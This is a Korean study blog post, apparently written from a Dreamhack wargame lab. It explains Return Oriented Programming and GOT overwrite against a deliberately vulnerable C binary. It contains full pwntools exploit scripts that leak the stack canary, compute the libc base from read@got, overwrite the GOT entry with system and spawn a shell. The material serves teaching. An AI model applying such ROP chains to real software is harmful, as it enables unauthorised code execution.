---
layout: single
title: "Return Oriented Programming - ROP"
date: 2024-04-06 18:09 +0900
categories: 
    - SYSTEM-study
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---



## **Return Oriented Programming(ROP)**

- 스택의 반환 주소를 덮는 공격은 스택 카나리, NX, ASLR이 도입되며 점점 어려워짐
- 공격 기법이 셸 코드 실행에서 라이브러리 함수 실행, 다수의 리턴 가젯을 연결하는 ROP로 발전
- 지난 실습에 바이너리 PLT에 system 함수를 포함시켰는데, 실제 바이너리에서 system 함수가 포함될 가능성은 거의 없음 
- 현실적으로 ASLR이 걸린 환경에서 system 함수를 사용하려면 프로세스 libc가 매핑된 주소를 찾고, 그 주소로부터 system 함수의 offset을 이용하여 함수의 주소를 계산해야 함 

<br>

- ROP는 리턴 가젯을 사용하여 복잡한 실행 흐름을 구현하는 기법
- 이를 이용해 Return to Library, return to dl-resolve, GOT overwrite 등의 페이로드를 구성할 수 있음
- ROP 페이로드는 리턴가젯으로 구성되는데, ret 단위로 여러 코드가 연쇄적으로 실행되는 모습에서 ROP chain이라고도 불림 

<br/>

### 실습 

- 아래 제공되는 코드는 dreamhack 사이트에서 스택 카나리, NX을 적용하여 컴파일한 바이너리를, ROP를 이용한 GOT Overwrite으로 익스플로잇하는 실습하기 위해 제공한 소스 코드임

  ```c
  // Name: rop.c
  // Compile: gcc -o rop rop.c -fno-PIE -no-pie
  
  #include <stdio.h>
  #include <unistd.h>
  
  int main() {
    char buf[0x30];
  
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
  
    // Leak canary
    puts("[1] Leak Canary");
    write(1, "Buf: ", 5);
    read(0, buf, 0x100);
    printf("Buf: %s\n", buf);
  
    // Do ROP
    puts("[2] Input ROP payload");
    write(1, "Buf: ", 5);
    read(0, buf, 0x100);
  
    return 0;
  }
  ```

<br/>

checksec 도구를 이용해 바이너리에 적용된 메모리 보호 기법을 확인해볼 수 있음

![image-20240406184324793](/images/2024-04-06-Return Oriented Programming/image-20240406184324793.png)

<br/>

이번 실습 코드는 bin/sh 가 데이터  영역에 포함되지 않고 system 함수도 plt에 포함하고 있지 않음. 따라서 system 함수를 익스플로잇에 사용하려면 함수의 주소를 직접 구해야 하고, bin/sh 문자를 사용할 다른 방법을 고민해야 함 

<br>

system 함수는 libc.so.6에 정의되어 있으며, 해당 라이브러리는 이 바이너리가 호출하는 read, puts, printf 도 정의되어 있음    

라이브러리 파일은 메모리가 매핑될 때 전체 매핑되므로, 다른 함수들과 함께 system 함수도 프로세스 메모리에 같이 적재됨

바이너리가 시스템 함수를 직접 호출하지는 않아서 system 함수가 GOT에 등록되지 않았지만 read, puts printf는 GOT에 등록되어 있음

main 함수에서 반환될 때 이 함수들을 모두 호출한 이후이므로, 이들의 GOT를 읽을 수 있으면 libc.so.6의 라이브러리 파일이 매핑된 주소를 알 수 있음

- libc 에서는 같은 libc 안에서 두 데이터 사이의 offset이 항상 같으므로, libc 버전을 알고, libc가 매핑된 영역의 임의 주소를 구할 수 있으면 다른 데이터의 주소도 모두 계산할 수 있음 

<br>

### offset 구하는 방법 

```bash
$ readelf -s libc.so.6 | grep " read@"
   289: 0000000000114980   157 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
$ readelf -s libc.so.6 | grep " system@"
  1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

- 위 명령을 통해 read 함수의 오프셋은 0x114980이고, system 함수의 오프셋은 0x50d60이라는 것을 알 수 있음

- read와 system과의 오프셋은 값이 더 높은 0x114980에서 0x50d60을 빼면 0xc3c20이 나오게 됨
- 따라서 rop.c 소스 코드에서는 read, puts, printf가 GOT에 등록되어 있으므로, 이 중 하나의 GOT 값을 얻고, 그 함수와 system과의 거리를 이용해서 system의 함수 주소를 읽을 수 있게 됨 

<br/>

### "bin/sh"

- 바이너리에 bin/sh 문자열이 데이터 영역에 없을 때, 임의 버퍼에 직접 주입하여 참조하거나, 다른 파일에 포함된 것을 사용해야 함
- 후자의 방법을 선택할 때 많이 사용되는 것이 libc.so.6에 포함된 "/bin/sh" 문자열임 
- 이 문자열의 주소도 system 함수의 주소를 계산할 때처럼 libc 영역의 임의의 주소를 구하고, 그 주소로부터 거리를 더하거나 빼서 계산할 수 있음 
- 이 방법은 주소를 알고 있는 버퍼에 "/bin/sh"를 입력하기 어려울 때 차선책으로 사용 가능함 
- 아래는 바이너리를 pwndbg로 실행 후, start 명령을 입력하고 /bin/sh의 주소를 알아낸 모습임

![image-20240407003844780](/images/2024-04-06-Return Oriented Programming/image-20240407003844780.png)

- 이번 실습에서는 ROP로 버퍼에 /bin/sh 를 입력하고, 이를 참조해볼 것임 

<br/>

### GOT Overwrite

- system 함수와 "/bin/sh" 문자열의 주소를 알고 있으므로, 지난 코스에서처럼 `pop rdi; ret` 가젯을 `system("/bin/sh"))`를 호출할 수 있음
- 그러나 system 함수의 주소를 알았을 때는 이미 ROP 페이로드가 전송된 이후이므로, 알아낸 system 함수의 주소를 페이로드에 사용하려면 main함수로 돌아가서 다시 버퍼 오버플로우를 일으켜야 함 
  - 이와 같은 공격 패턴을 ret2main이라고 부름 
- GOT Overwite는 라이브러리에서 함수가 호출될 때  GOT에 값을 저장시켜, 그 함수가 한 번 더 호출될 때 이 값을 수정하는 것 
  - 이때 이 GOT에 적힌 주소를 검증하지 않고 참조함 

<br/>

### Canary Leak 

- 아래는 pwntools 를 이용해 위 위  rop 바이너리에 대한 Canary를 Leak하는 익스 코드이다. 
- process 명령으로 바이너리를 지정 
- context.arch 명령으로 아키텍처 지정
- ELF 명령으로 보호 기법 및 아키텍처 확인
- slog 함수로 canary 값을 가시성이 좋게 함 
- 38바이트까지이므로 Buf: 라는 문자열이 나오면 39바이트를 보내 카나리를 릭하고, 이를 전달받아 cnry 변수에 언패킹을 이용해 카나리 저장. 그리고 slog 함수로 카나리 출력 

<img src="/images/2024-04-06-Return Oriented Programming/image-20240407013635959.png" alt="image-20240407013635959" style="zoom: 50%;" />

<img src="/images/2024-04-06-Return Oriented Programming/image-20240407014134580.png" alt="image-20240407014134580" style="zoom:50%;" />

<br/>

### system 함수의 주소 계산 

- read 함수의 got를 읽고, read 함수와 system 함수의 오프셋을 이용하여 system 함수의 주소를 계산해야 함
- pwntools 도구에는 ELF.symbols이라는 메소드가 정의되어 있는데, 특정 ELF에서 심볼 사이의 오프셋을 계산할 때 유용하게 사용할 수 있음 
- ubuntu 22.04에서 동일한 옵션에서 컴파일해도 ROP 가젯이 없는 경우가 존재하는데, Glibc 2.3.4 버전 이상은 버전 이하에서 프로그램을 초기화하는 과정에서 `__libc_csu_init()`이 호출되는데 여기에 ROP 공격에 유용한 가젯이 포함되기 때문에 우분투 22.04 버전은 존재하지 않을 수 있음 
- 아래 소스 코드를 살펴보면 2번째 입력 부분에 스택 버퍼오버플로우 취약점이 존재하고, pwntools 도구의  ELF를 이용해 바이너리 ELF를 이용해서 read, write의 plt와 got를 구하고 인자가 rdi, rsi, rdx, rcx, r8, r9, r15 순으로 들어가기 때문에 rdi와 rsi, r15의 리턴 가젯을 구한 후 write의 plt를 사용해 인자를 payload에 설정하고 read@got 값을 화면에 써서 출력한다. 
- 다음으로 read@got 값과 원래 있는 라이브러리 read의 주소의 차이를 구하고 이 차이만큼 system 라이브러리에 더해서 system@got까지 구할 수 있다. 

```python
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.interactive()
```

<br/>

### GOT Overwrite 및 “/bin/sh” 입력

- "/bin/sh"는 덮어쓸 엔트리 뒤에 같이 입력하면 된다.
- 이 바이너리에는 read함수를 사용할 수 있고, read 함수는 입력 스트림, 입력 버퍼, 입력 크기의 세 가지 인자를 받는다.

- rdi와 rsi는 전에 있는 리턴 가젯을 사용하면 되지만 rdx와 관련된 가젯은 바이너리에서 찾기 어렵다. 
  - libc의 코드 가젯이나 libc_csu_init 가젯을 사용하면 된다. 또는 strncmp 함수에서 rax로 비교 결과를 반환하고 rdx로 두 문자열이 첫 번째 문자부터 가장 긴 부분 문자열의 길이를 반환한다.
  - `ROPgadget --binary ./libc.so.6 --re "pop rdx"` 명령을 통해서 libc 파일에서 가젯을 구하면 된다. 

<br/>

### 최종 익스플로잇 코드

- libc 파일 같은 경우 우분투 버전마다 미세하게 다를 수 있기 때문에 워게임 같은 문제에서 제공하는 libc를 쓰면 좋음 
- 첫 번째 입력은 카니리릭, 두 번째 입력은 카나리를 우회하여 카나리와 반환 주소를 0x8만큼 dummy를 B로 입력시킨 후 반환 주소에 write로 read_got 주소를 출력해준다.
- read함수로 read_got 값의 주소를 읽어주고, 다음 코드에 위치를 read_got+0x8로 이동시켜 주면서 movaps 명령에 맞게 0x10 단위로 맞춰주기 위해 ret 가젯을 추가로 넣어준다. 
- 출력된 read_got 주소와 libc 주소의 read 주소의 차이를 구해 이 차이만큼 libc의 system 주소에 더해서 p.send 명령으로 system 함수를 호출해주고 p.interactive() 함수를 통해 쉘을 실행한다. 

```python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
```

<br/>

- **Return Oriented Programming(ROP)**: 리턴 가젯을 이용하여 복잡한 실행 흐름을 구현하는 기법. 문제 상황에 맞춰 공격자가 유연하게 익스플로잇을 작성할 수 있다.
- **GOT Overwrite**: 어떤 함수의 GOT 엔트리를 덮고, 해당 함수를 재호출하여 원하는 코드를 실행시키는 공격 기법

